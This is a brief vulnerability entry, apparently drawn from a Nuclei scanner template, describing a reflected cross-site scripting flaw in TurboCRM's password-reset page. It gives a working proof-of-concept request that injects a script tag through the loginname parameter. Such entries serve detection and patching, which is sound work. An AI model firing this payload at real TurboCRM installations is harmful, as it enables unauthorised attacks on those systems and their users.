# Vulnerability: TurboCRM - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`turbocrm-xss.yaml`)

## Description
TurboCRM contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript into the response returned by the application.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

